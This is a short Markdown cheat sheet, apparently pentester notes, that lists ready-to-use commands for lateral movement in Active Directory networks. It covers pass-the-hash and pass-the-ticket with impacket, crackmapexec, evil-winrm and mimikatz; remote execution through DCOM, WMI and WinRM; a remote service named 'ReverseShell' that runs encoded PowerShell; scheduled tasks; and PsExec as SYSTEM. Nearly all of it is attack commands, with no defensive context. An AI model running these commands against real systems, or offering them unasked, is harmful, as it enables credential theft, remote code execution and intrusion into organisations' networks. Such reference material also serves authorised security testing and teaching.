# Lateral Movement in AD

## Pass-the-Hash (PtH)
```bash
impacket-wmiexec $DOMAIN/user@$TARGET_IP -hashes LMHASH:NTHASH
impacket-psexec $DOMAIN/user@$TARGET_IP -hashes LMHASH:NTHASH
impacket-smbexec $DOMAIN/user@$TARGET_IP -hashes LMHASH:NTHASH
crackmapexec smb $TARGET_IP -u user -H NTHASH -x whoami
crackmapexec winrm $TARGET_IP -u user -H NTHASH -x whoami
evil-winrm -i $TARGET_IP -u user -H NTHASH
```

## Overpass-the-Hash
```cmd
mimikatz
sekurlsa::pth /user:admin /domain:$DOMAIN /ntlm:HASH
# Opens cmd.exe as that user → request TGT: klist
```

## Pass-the-Ticket (PtT)
```cmd
sekurlsa::tickets /export
kerberos::ptt ticket.kirbi
klist
```

## DCOM
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","$TARGET_IP"))
$com.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c whoami","Minimized")
```

## WMI
```cmd
wmic /node:$TARGET_IP /user:admin /password:pass process call create "cmd.exe /c whoami"
```

## WinRM
```bash
evil-winrm -i $TARGET_IP -u admin -p password
evil-winrm -i $TARGET_IP -u admin -H NTHASH
```

## SC (Service Control) Remote
```cmd
sc \\$TARGET_IP create ReverseShell binPath= "cmd.exe /c powershell -enc <BASE64>"
sc \\$TARGET_IP start ReverseShell
sc \\$TARGET_IP delete ReverseShell
```

## Scheduled Tasks Remote
```cmd
schtasks /create /s $TARGET_IP /u $DOMAIN\admin /p password /tn "Update" /tr "powershell -enc <BASE64>" /sc once /st 00:00
schtasks /run /s $TARGET_IP /u $DOMAIN\admin /p password /tn "Update"
```

## PsExec
```cmd
psexec \\$TARGET_IP -u admin -p password cmd.exe
psexec \\$TARGET_IP -u admin -p password -s cmd.exe  # As SYSTEM
```
